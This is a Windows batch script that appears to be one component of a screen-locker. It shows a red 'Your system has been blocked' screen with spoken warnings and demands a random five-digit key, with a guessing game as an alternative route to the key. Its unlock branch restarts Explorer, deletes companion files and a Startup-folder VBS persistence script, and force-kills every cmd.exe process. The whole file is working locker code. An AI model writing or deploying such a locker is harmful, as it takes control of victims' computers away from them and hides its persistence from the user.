@echo off
	setlocal enabledelayedexpansion

	
	
	
	title SYSTEM_BLOCK
	for /f "tokens=2 delims=," %%a in ( 'tasklist /v /fo csv ^| findstr /i "SYSTEM_BLOCK"' ) do (
    set "mypid=%%~a"
	)
	echo !mypid!>"!appdata!\pbv.txt"

	set try_remaining=7
	
	set /a t1=%random% %% 10
	set /a t2=%random% %% 10
	set /a t3=%random% %% 10
	set /a t4=%random% %% 10
	set /a t5=%random% %% 10

	set n1=0
	set n2=0
	set n3=0
	set n4=0
	set n5=0
	
	
	
	color 4f
	:block
	cls
	echo.
	call :speak "Your system has been blocked, type the correct key to unlock your pc."
	call :colormsg 44 "-"
	call :colormsg cf "Your system has been blocked"
	echo.
	echo.
	call :colormsg 44 "-"
	call :colormsg cf "Type 'unlock' or 'enterkey''"
	echo.
	echo.
	call :colormsg 44 "-"
	call :colormsg 48 "locked"
	call :colormsg 4f "@"
	call :colormsg 4a "user"
	set /p input=[]-
	
	
	if !input!==enterkey (
	cls
	echo.
	call :colormsg 44 "-"
	call :colormsg cf "Enter key"
	echo.
	echo.
	call :colormsg 44 "-"
	call :colormsg 48 "Key[]-"
	set /p keycode=
	
	
	
		if "!keycode!"=="!t1!-!t2!-!t3!-!t4!-!t5!" (
	
		start explorer.exe
		del "!appdata!\bv_chk.bat"
		del "!appdata!\bv.bat"
		del "!appdata!\colorchar.exe"
		del "!appdata!\pbv.txt"
		del "!appdata!\Microsoft\Windows\^Start Menu\Programs\Startup\srun.vbs"
		taskkill /f /im cmd.exe
		
	
	
	
	
	
	
	
		)else (
		echo.
		call :colormsg 44 "-"
		call :colormsg 4f "Incorrect Entry"
		timeout /t 3 >nul
		cls
		set input=
		goto :block
		
		)
	
	
	
	)
	
	
	
	

	if !input!==unlock (
	cls
	echo.
	call :colormsg 44 "-"
	call :speak "If you want to unlock your pc, you have to solve this code"
	call :colormsg cf "If you want to unlock your pc, you have to solve this code"
	call :colormsg 44 "-"
	echo.
	echo.
	echo  This code has 5 digits
	echo  When you find a digit, it turns to green
	echo  If you make all of them green, you get your key
	echo.
	call :default

	
	
	

	call :colormsg 44 "-"
	call :colormsg 4f "Press any key to start"
	pause >nul
	
	:find_the_code
	set i1=
	set i2=
	set i3=
	set i4=
	set i5=
	cls
	echo.
	call :colormsg 44 "-"
	call :colormsg cf "Find the code"
	echo.
	echo.
	
	
	
	echo  Remaining try count !try_remaining!
	echo.
	
	
	
	call :colormsg 44 "-"
	call :colormsg cf "Current digits"
	echo.
	echo.
	
	
	
	call :colormsg 44 "-"
	call :colormsg !c1! "!n1!"
	call :colormsg 4f "-"
	call :colormsg !c2! "!n2!"
	call :colormsg 4f "-"
	call :colormsg !c3! "!n3!"
	call :colormsg 4f "-"
	call :colormsg !c4! "!n4!"
	call :colormsg 4f "-"
	call :colormsg !c5! "!n5!"
	
	
	
	
	echo.
	echo.
	call :default
	
	
	call :colormsg 44 "-"
	call :colormsg 48 "Number [1]-"
	set /p i1=
	if !i1!==!t1! (
	set c1=4a
	)
	set n1=!i1!

	call :colormsg 44 "-"
	call :colormsg 48 "Number [2]-"
	set /p i2=
	if !i2!==!t2! (
	set c2=4a
	)
	set n2=!i2!
		
	call :colormsg 44 "-"
	call :colormsg 48 "Number [3]-"
	set /p i3=
	if !i3!==!t3! (
	set c3=4a
	)
	set n3=!i3!

	call :colormsg 44 "-"
	call :colormsg 48 "Number [4]-"
	set /p i4=
	if !i4!==!t4! (
	set c4=4a
	)
	set n4=!i4!
		
	call :colormsg 44 "-"
	call :colormsg 48 "Number [5]-"
	set /p i5=
	if !i5!==!t5! (
	set c5=4a
	)
	set n5=!i5!
	



	if "!n1!"=="" (
	echo.
	echo  No blank space
	timeout /t 3 >nul
	set n1=0
	set n2=0
	set n3=0
	set n4=0
	set n5=0
	cls
	goto :find_the_code
	)
		if "!n2!"=="" (
	echo.
	echo  No blank space
	timeout /t 3 >nul
	set n1=0
	set n2=0
	set n3=0
	set n4=0
	set n5=0
	cls
	goto :find_the_code
	)
	
		if "!n3!"=="" (
	echo.
	echo  No blank space
	timeout /t 3 >nul
	set n1=0
	set n2=0
	set n3=0
	set n4=0
	set n5=0
	cls
	goto :find_the_code
	)
		if "!n4!"=="" (
	echo.
	echo  No blank space
	timeout /t 3 >nul
	set n1=0
	set n2=0
	set n3=0
	set n4=0
	set n5=0
	cls
	goto :find_the_code
	)
		if "!n5!"=="" (
	echo.
	echo  No blank space
	timeout /t 3 >nul
	set n1=0
	set n2=0
	set n3=0
	set n4=0
	set n5=0
	cls
	goto :find_the_code
	)
	
	if "!n1!-!n2!-!n3!-!n4!-!n5!"=="!t1!-!t2!-!t3!-!t4!-!t5!" (
	cls
	echo.
	call :colormsg 44 "-"
	call :colormsg cf "Password is"
	call :colormsg 4f " !t1!-!t2!-!t3!-!t4!-!t5!"
	echo.
	echo.
	echo  Press any key to continue...
	pause >nul
	cls
	set choice=
	goto :block
	)	
		
		
	set /a try_remaining=!try_remaining!-1	
	cls
	if !try_remaining!==0 (
	cls
	echo.
	call :colormsg 44 "-"
	call :colormsg cf "No try lives left"
	timeout /t 3 >nul
	exit
	taskkill /f /im cmd.exe
	
	)
	goto :find_the_code
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	
	
	
	)

	
	
	
	
	
	
	
	
	set choice=
	timeout /t 3 >nul
	cls
	goto :block



	:speak
	echo set speech = Wscript.CreateObject("SAPI.spVoice") >>"!appdata!\hello.vbs"
	set text=%~1
	echo speech.speak "%text%">>"!appdata!\hello.vbs"
	start !appdata!\hello.vbs
	Attrib +h +s +r "!appdata!\hello.vbs"
	timeout /t 1 /nobreak >nul
	Attrib -h -s -r "!appdata!\hello.vbs"
	del "!appdata!\hello.vbs"
	goto :eof




	
	:colormsg
	call "!appdata!\colorchar.exe" /%1 %2
	goto :eof
	
	
	
	
	
	
	
	
	
	
	
	
	
	:default
	set c1=4f
	set c2=4f
	set c3=4f
	set c4=4f
	set c5=4f
	goto :eof

	:create_string
	set /a takeaway=4
	set string=%2
	echo %string%>var.txt
	
	for /f "useback tokens=*" %%a in ( '%string%' ) do (
	if %string%==%%~a (
	set /a takeaway=2
	)
	
	set string=%%~a
	
	)
	set %1=%string%
	
	for %%I in ( var.txt ) do (
	set /a %1_length=%%~zI - %takeaway%
	)
	del var.txt
	goto :eof
	
	
	
	
	
	:character_finder
	set character_found=false
	call :create_string string_find "%~1"
	set /a string_find_length=!string_find_length! - 1
	for /l %%a in ( 0, 1, !string_find_length! ) do (
		set character=!string_find:~%%a,1!
		if "!character!"=="%~2" (
		set character_found=true
		)
	)
	goto :eof
	
	